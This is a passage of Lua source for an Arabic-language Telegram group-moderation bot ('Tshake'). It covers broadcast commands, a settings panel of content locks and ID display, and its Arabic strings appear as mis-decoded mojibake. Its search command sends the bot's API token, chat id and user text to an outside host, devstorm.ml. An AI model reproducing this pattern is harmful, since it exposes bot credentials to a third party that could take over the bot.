send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Tshake:Tshake:Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"πβΏΨ§Ψ±Ψ³Ω ΩΩ Ψ³ΩΨ§Ψ‘ ~ { ΩΩΨ΅Ω, ΩΨͺΨ­Ψ±ΩΩ, Ψ΅ΩΨ±Ω, Ψ±Ψ³Ψ§ΩΩ }\nβ«οΈβΏΩΩΨ?Ψ±ΩΨ¬ Ψ§Ψ±Ψ³Ω Ψ§ΩΨΊΨ§Ψ‘ ") 
return false
end  
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ" and msg.reply_to_message_id_ == 0  and DevBot(msg) then 
if database:get(bot_id.."Tshake:Status:Bc") and not DevTshake(msg) then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Tshake:Tshake:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"π βΏΨ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ§ΩΨ§Ω") 
return false
end 
if text=="Ψ§Ψ°Ψ§ΨΉΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ Ψ?Ψ§Ψ΅" and msg.reply_to_message_id_ == 0  and DevBot(msg) then 
if database:get(bot_id.."Tshake:Status:Bc") and not DevTshake(msg) then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨ§ΩΨ§Ψ°Ψ§ΨΉΩ ΩΨΉΨ·ΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω")
return false
end
database:setex(bot_id.."Tshake:Tshake:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_,"π βΏΨ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨͺΩΨ¬ΩΩ Ψ§ΩΨ§Ω") 
return false
end 

if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ" and DevTshake(msg) then  
database:del(bot_id.."Tshake:Status:Bc") 
send(msg.chat_id_, msg.id_,"\nβ«οΈβΏΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ " ) 
return false
end 
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ" and DevTshake(msg) then  
database:set(bot_id.."Tshake:Status:Bc",true) 
send(msg.chat_id_, msg.id_,"\nβ«οΈβΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ") 
return false
end 

if text == "Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ" and Addictive(msg) then    
if database:get(bot_id.."Tshake:lockpin"..msg.chat_id_) then    
lock_pin = "βοΈ"
else 
lock_pin = "β"    
end
if database:get(bot_id.."Tshake:Lock:tagservr"..msg.chat_id_) then    
lock_tagservr = "βοΈ"
else 
lock_tagservr = "β"    
end
if database:get(bot_id.."Tshake:Lock:text"..msg.chat_id_) then    
lock_text = "βοΈ"
else 
lock_text = "β"    
end
if database:get(bot_id.."Tshake:Lock:AddMempar"..msg.chat_id_) == "kick" then
lock_add = "βοΈ"
else 
lock_add = "β"    
end    
if database:get(bot_id.."Tshake:Lock:Join"..msg.chat_id_) == "kick" then
lock_join = "βοΈ"
else 
lock_join = "β"    
end    
if database:get(bot_id.."Tshake:Lock:edit"..msg.chat_id_) then    
lock_edit = "βοΈ"
else 
lock_edit = "β"    
end
if database:get(bot_id.."Tshake:Get:Welcome:Group"..msg.chat_id_) then
welcome = "βοΈ"
else 
welcome = "β"    
end
if database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_, "flood") == "kick" then     
flood = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"     
elseif database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"flood") == "keed" then     
flood = "Ψ¨Ψ§ΩΨͺΩΩΨ―"     
elseif database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"flood") == "mute" then     
flood = "Ψ¨Ψ§ΩΩΨͺΩ"           
elseif database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"flood") == "del" then     
flood = "Ψ¨Ψ§ΩΩΨ³Ψ­"           
else     
flood = "β"     
end
if database:get(bot_id.."Tshake:Lock:Photo"..msg.chat_id_) == "del" then
lock_photo = "βοΈ" 
elseif database:get(bot_id.."Tshake:Lock:Photo"..msg.chat_id_) == "ked" then 
lock_photo = "Ψ¨Ψ§ΩΨͺΩΩΨ―"   
elseif database:get(bot_id.."Tshake:Lock:Photo"..msg.chat_id_) == "ktm" then 
lock_photo = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:Photo"..msg.chat_id_) == "kick" then 
lock_photo = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"   
else
lock_photo = "β"   
end    
if database:get(bot_id.."Tshake:Lock:Contact"..msg.chat_id_) == "del" then
lock_phon = "βοΈ" 
elseif database:get(bot_id.."Tshake:Lock:Contact"..msg.chat_id_) == "ked" then 
lock_phon = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:Contact"..msg.chat_id_) == "ktm" then 
lock_phon = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:Contact"..msg.chat_id_) == "kick" then 
lock_phon = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_phon = "β"    
end    
if database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "del" then
lock_links = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "ked" then
lock_links = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "ktm" then
lock_links = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:Link"..msg.chat_id_) == "kick" then
lock_links = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_links = "β"    
end
if database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "del" then
lock_cmds = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "ked" then
lock_cmds = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "ktm" then
lock_cmds = "Ψ¨Ψ§ΩΩΨͺΩ"   
elseif database:get(bot_id.."Tshake:Lock:Cmd"..msg.chat_id_) == "kick" then
lock_cmds = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_cmds = "β"    
end
if database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "del" then
lock_user = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "ked" then
lock_user = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "ktm" then
lock_user = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:User:Name"..msg.chat_id_) == "kick" then
lock_user = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_user = "β"    
end
if database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "del" then
lock_hash = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "ked" then 
lock_hash = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "ktm" then 
lock_hash = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:hashtak"..msg.chat_id_) == "kick" then 
lock_hash = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_hash = "β"    
end
if database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "del" then
lock_muse = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "ked" then 
lock_muse = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "ktm" then 
lock_muse = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "kick" then 
lock_muse = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_muse = "β"    
end 
if database:get(bot_id.."Tshake:Lock:Video"..msg.chat_id_) == "del" then
lock_ved = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:Video"..msg.chat_id_) == "ked" then 
lock_ved = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:Video"..msg.chat_id_) == "ktm" then 
lock_ved = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:Video"..msg.chat_id_) == "kick" then 
lock_ved = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_ved = "β"    
end
if database:get(bot_id.."Tshake:Lock:Animation"..msg.chat_id_) == "del" then
lock_gif = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:Animation"..msg.chat_id_) == "ked" then 
lock_gif = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:Animation"..msg.chat_id_) == "ktm" then 
lock_gif = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:Animation"..msg.chat_id_) == "kick" then 
lock_gif = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_gif = "β"    
end
if database:get(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_) == "del" then
lock_ste = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_) == "ked" then 
lock_ste = "Ψ¨Ψ§ΩΨͺΩΩΨ― "    
elseif database:get(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_) == "ktm" then 
lock_ste = "Ψ¨Ψ§ΩΩΨͺΩ "    
elseif database:get(bot_id.."Tshake:Lock:Sticker"..msg.chat_id_) == "kick" then 
lock_ste = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_ste = "β"    
end
if database:get(bot_id.."Tshake:Lock:geam"..msg.chat_id_) == "del" then
lock_geam = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:geam"..msg.chat_id_) == "ked" then 
lock_geam = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:geam"..msg.chat_id_) == "ktm" then 
lock_geam = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:geam"..msg.chat_id_) == "kick" then 
lock_geam = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_geam = "β"    
end    
if database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "del" then
lock_vico = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "ked" then 
lock_vico = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "ktm" then 
lock_vico = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:vico"..msg.chat_id_) == "kick" then 
lock_vico = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_vico = "β"    
end    
if database:get(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_) == "del" then
lock_inlin = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_) == "ked" then 
lock_inlin = "Ψ¨Ψ§ΩΨͺΩΩΨ―"
elseif database:get(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_) == "ktm" then 
lock_inlin = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:Keyboard"..msg.chat_id_) == "kick" then 
lock_inlin = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"
else
lock_inlin = "β"
end
if database:get(bot_id.."Tshake:Lock:forward"..msg.chat_id_) == "del" then
lock_fwd = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:forward"..msg.chat_id_) == "ked" then 
lock_fwd = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:forward"..msg.chat_id_) == "ktm" then 
lock_fwd = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:forward"..msg.chat_id_) == "kick" then 
lock_fwd = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_fwd = "β"    
end    
if database:get(bot_id.."Tshake:Lock:Document"..msg.chat_id_) == "del" then
lock_file = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:Document"..msg.chat_id_) == "ked" then 
lock_file = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:Document"..msg.chat_id_) == "ktm" then 
lock_file = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:Document"..msg.chat_id_) == "kick" then 
lock_file = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_file = "β"    
end    
if database:get(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_) == "del" then
lock_self = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_) == "ked" then 
lock_self = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_) == "ktm" then 
lock_self = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:Unsupported"..msg.chat_id_) == "kick" then 
lock_self = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_self = "β"    
end
if database:get(bot_id.."Tshake:Lock:Bot:kick"..msg.chat_id_) == "del" then
lock_bots = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:Bot:kick"..msg.chat_id_) == "ked" then
lock_bots = "Ψ¨Ψ§ΩΨͺΩΩΨ―"   
elseif database:get(bot_id.."Tshake:Lock:Bot:kick"..msg.chat_id_) == "kick" then
lock_bots = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_bots = "β"    
end
if database:get(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_) == "del" then
lock_mark = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_) == "ked" then 
lock_mark = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_) == "ktm" then 
lock_mark = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:Markdaun"..msg.chat_id_) == "kick" then 
lock_mark = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_mark = "β"    
end
if database:get(bot_id.."Tshake:Lock:Spam"..msg.chat_id_) == "del" then    
lock_spam = "βοΈ"
elseif database:get(bot_id.."Tshake:Lock:Spam"..msg.chat_id_) == "ked" then 
lock_spam = "Ψ¨Ψ§ΩΨͺΩΩΨ―"    
elseif database:get(bot_id.."Tshake:Lock:Spam"..msg.chat_id_) == "ktm" then 
lock_spam = "Ψ¨Ψ§ΩΩΨͺΩ"    
elseif database:get(bot_id.."Tshake:Lock:Spam"..msg.chat_id_) == "kick" then 
lock_spam = "Ψ¨Ψ§ΩΨ·Ψ±Ψ―"    
else
lock_spam = "β"    
end        
if not database:get(bot_id.."Tshake:Reply:Manager"..msg.chat_id_) then
rdmder = "βοΈ"
else
rdmder = "β"
end
if not database:get(bot_id.."Tshake:Reply:Sudo"..msg.chat_id_) then
rdsudo = "βοΈ"
else
rdsudo = "β"
end
if not database:get(bot_id.."Tshake:Lock:ID:Bot"..msg.chat_id_)  then
idgp = "βοΈ"
else
idgp = "β"
end
if not database:get(bot_id.."Tshake:Lock:ID:Bot:Photo"..msg.chat_id_) then
idph = "βοΈ"
else
idph = "β"
end
if not database:get(bot_id.."Tshake:Lock:kick"..msg.chat_id_)  then
setadd = "βοΈ"
else
setadd = "β"
end
if not database:get(bot_id.."Tshake:Lock:Add:Bot"..msg.chat_id_)  then
banm = "βοΈ"
else
banm = "β"
end
if not database:get(bot_id.."Tshake:Kick:Me"..msg.chat_id_) then
kickme = "βοΈ"
else
kickme = "β"
end
Num_Flood = database:hget(bot_id.."Tshake:flooding:settings:"..msg.chat_id_,"floodmax") or 0
local text = 
"*\nπ‘βΏΨ§Ψ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ Ψ§ΩΩΨ¬ΩΩΨΉΩ "..
"\nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» "..
"\nπβΏΨΉΩΨ§ΩΨ© Ψ§Ω {βοΈ} ΨͺΨΉΩΩ ΩΩΨΉΩ"..
"\nπβΏΨΉΩΨ§ΩΨ© Ψ§Ω {β} ΨͺΨΉΩΩ ΩΨΉΨ·Ω"..
"\nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» "..
"\nπβΏΨ§ΩΨ±ΩΨ§Ψ¨Ψ· Β» "..lock_links..
"\n".."πβΏΨ§ΩΩΨΉΨ±ΩΨ§Ψͺ Β» "..lock_user..
"\n".."πβΏΨ§ΩΨͺΨ§Ω Β» "..lock_hash..
"\n".."πβΏΨ§ΩΨ¨ΩΨͺΨ§Ψͺ Β» "..lock_bots..
"\n".."πβΏΨ§ΩΨͺΩΨ¬ΩΩ Β» "..lock_fwd..
"\n".."πβΏΨ§ΩΨͺΨ«Ψ¨ΩΨͺ Β» "..lock_pin..
"\n".."πβΏΨ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ Β» "..lock_tagservr..
"\n".."πβΏΨ§ΩΩΨ§Ψ±ΩΨ―ΩΩ Β» "..lock_mark..
"\n".."πβΏΨ§ΩΨͺΨΉΨ―ΩΩ Β» "..lock_edit..
"\nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» "..
"\n".."πβΏΨ§ΩΩΩΨ§ΩΨ΄ Β» "..lock_spam..
"\n".."πβΏΨ§ΩΩΩΨ¨ΩΨ±Ψ― Β» "..lock_inlin..
"\n".."πβΏΨ§ΩΨ§ΨΊΨ§ΩΩ Β» "..lock_vico..
"\n".."πβΏΨ§ΩΩΨͺΨ­Ψ±ΩΩ Β» "..lock_gif..
"\n".."πβΏΨ§ΩΩΩΩΨ§Ψͺ Β» "..lock_file..
"\n".."πβΏΨ§ΩΨ―Ψ±Ψ―Ψ΄Ω Β» "..lock_text..
"\n".."πβΏΨ§ΩΩΩΨ―ΩΩ Β» "..lock_ved..
"\n".."πβΏΨ§ΩΨ΅ΩΨ± Β» "..lock_photo..
"\nΒ«|β β‘β β‘β β‘β β‘β β‘β β‘β β‘β |Β» "..
"\n".."πβΏΨ§ΩΨ΅ΩΨͺ Β» "..lock_muse..
"\n".."πβΏΨ§ΩΩΩΨ΅ΩΨ§Ψͺ Β» "..lock_ste..
"\n".."πβΏΨ§ΩΨ¬ΩΨ§Ψͺ Β» "..lock_phon..
"\n".."πβΏΨ§ΩΨ―Ψ?ΩΩ Β» "..lock_join..
"\n".."πβΏΨ§ΩΨ§ΨΆΨ§ΩΩ Β» "..lock_add..
"\n".."πβΏΨ§ΩΨ³ΩΩΩΩ Β» "..lock_self..
"\n".."πβΏΨ§ΩΨ§ΩΨΉΨ§Ψ¨ Β» "..lock_geam..
"\n".."πβΏΨ§ΩΨͺΩΨ±Ψ§Ψ± Β» "..flood..
"\n".."πβΏΨ§ΩΨͺΨ±Ψ­ΩΨ¨ Β» "..welcome..
"\n".."πβΏΨΉΨ―Ψ― Ψ§ΩΨͺΩΨ±Ψ§Ψ± Β» "..Num_Flood..
"\n\n.*"
send(msg.chat_id_, msg.id_,text)     
end    
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄" and Owner(msg) then    
send(msg.chat_id_, msg.id_, 'ββΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄')
database:set(bot_id.."Tshake:Fun_Bots"..msg.chat_id_,"true")
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄" and Owner(msg) then    
send(msg.chat_id_, msg.id_,'ββΏΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄')
database:del(bot_id.."Tshake:Fun_Bots"..msg.chat_id_)
end

if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω' and Owner(msg) then   
database:del(bot_id..'Tshake:Lock:ID:Bot'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'ββΏΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω') 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω' and Owner(msg) then  
database:set(bot_id..'Tshake:Lock:ID:Bot'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'ββΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω') 
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω' and Owner(msg) then   
database:del(bot_id..'Tshake:Lock:ID:Bot:Photo'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'ββΏΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω') 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω' and Owner(msg) then  
database:set(bot_id..'Tshake:Lock:ID:Bot:Photo'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'ββΏΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω') 
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ²ΩΩ' and Owner(msg) then   
database:del(bot_id..'dw:bot:api'..msg.chat_id_) 
Text = '\n ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΩΨ²ΩΩΨ§Ψͺ' 
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ²ΩΩ' and Owner(msg) then  
database:set(bot_id..'dw:bot:api'..msg.chat_id_,true) 
Text = '\nΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΩΨ²ΩΩΨ§Ψͺ' 
send(msg.chat_id_, msg.id_,Text) 
end 
if text and text:match('^Ψ¨Ψ­Ψ« (.*)$') and not database:get(bot_id..'dw:bot:api'..msg.chat_id_) then            
local Ttext = text:match('^Ψ¨Ψ­Ψ« (.*)$') 
local msgin = msg.id_/2097152/0.5 
http.request('http://devstorm.ml/tshake/tahaj200.php?token='..token..'&chat_id='..msg.chat_id_..'&Text='..URL.escape(Ttext)..'&msg='..msgin)
end
if text == 'ΨͺΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω' and Owner(msg) then
database:setex(bot_id.."Tshake:Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_,240,true)  
local Text= [[
ββΏ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§Ω Ψ§ΩΩΨ΅
ββΏ ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΩ :
- `#username` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
- `#msgs` > ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
- `#photos` > ΨΉΨ―Ψ― Ψ΅ΩΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
- `#id` > Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
- `#auto` > ΨͺΩΨ§ΨΉΩ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω
- `#stast` > ΩΩΩΨΉ Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω 
- `#edit` > ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ­ΩΨ§Ψͺ
- `#game` > Ψ§ΩΩΨ¬ΩΩΨ±Ψ§Ψͺ
- `#AddMem` > ΨΉΨ―Ψ― Ψ§ΩΨ¬ΩΨ§Ψͺ
- `#Description` > ΨͺΨΉΩΩΩ Ψ§ΩΨ΅ΩΨ±Ω
]]
send(msg.chat_id_, msg.id_,Text)
return false  
end 
if text == 'Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ―Ω' or text == 'ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ―Ω' then
if Owner(msg) then
database:del(bot_id.."Tshake:Klesh:Id:Bot"..msg.chat_id_)
send(msg.chat_id_, msg.id_, 'πβΏΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω ')
end
return false  
end 

if database:get(bot_id.."Tshake:Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_) then 
if text == 'Ψ§ΩΨΊΨ§Ψ‘' then 
send(msg.chat_id_, msg.id_,"β«οΈβΏΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω") 
database:del(bot_id.."Tshake:Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
database:del(bot_id.."Tshake:Set:Id:Gp"..msg.chat_id_..""..msg.sender_user_id_) 
database:set(bot_id.."Tshake:Klesh:Id:Bot"..msg.chat_id_,text:match("(.*)"))
send(msg.chat_id_, msg.id_,'πβΏΨͺΩ ΨͺΨΉΩΩ Ψ§ΩΨ§ΩΨ―Ω')    
end

if text == 'Ψ§ΩΨ―Ω' and tonumber(msg.reply_to_message_id_) == 0 and not database:get(bot_id..'Tshake:Lock:ID:Bot'..msg.chat_id_) then
if not database:sismember(bot_id..'Tshake:Spam:Group'..msg.sender_user_id_,text) then
database:sadd(bot_id.."Tshake:Spam:Group"..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,taha,success) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,deata) 
if deata.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'ΩΩΨ΄Ψ¦'
elseif deata.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'Ψ§Ψ―ΩΩ' 
elseif deata.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'ΨΉΨΆΩ'
end

if deata.join_date_ ~= 0 then
tarek = os.date('%Y-%m-%d', deata.join_date_)
else
tarek = 'ΩΨ§ ΩΩΨ¬Ψ― ' 
end
if data.username_ then
UserName_User = '@'..data.username_
else
UserName_User = 'ΩΨ§ ΩΩΨ¬Ψ―'
end
local Id = msg.sender_user_id_
local NumMsg = database:get(bot_id..'Tshake:messageUser'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local getbioY = getbio(msg.sender_user_id_)
local TotalMsg = Total_message(NumMsg)
local Status_Gps = database:get(bot_id.."Tshake:Comd:New:rt:User:"..msg.chat_id_..Id) or Get_Rank(Id,msg.chat_id_)
local message_edit = database:get(bot_id..'Tshake:message_edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Num_Games = database:get(bot_id.."Tshak:Add:Num"..msg.chat_id_..msg.sender_user_id_) or 0
local Add_Mem = database:get(bot_id.."Tshake:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) or 0
local Total_Photp = (taha.total_count_ or 0)
local Texting = {
'Ψ?Ψ― ΩΨ³ΨͺΨ§ ΩΨΉΩΩΩΨ§ΨͺΩ Ψ§ΩΩ',
"Ψ?Ψ― Ψ¨Ψ§ΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ¨ΨͺΨ§ΨΉΩ ΩΩΩΨ²",
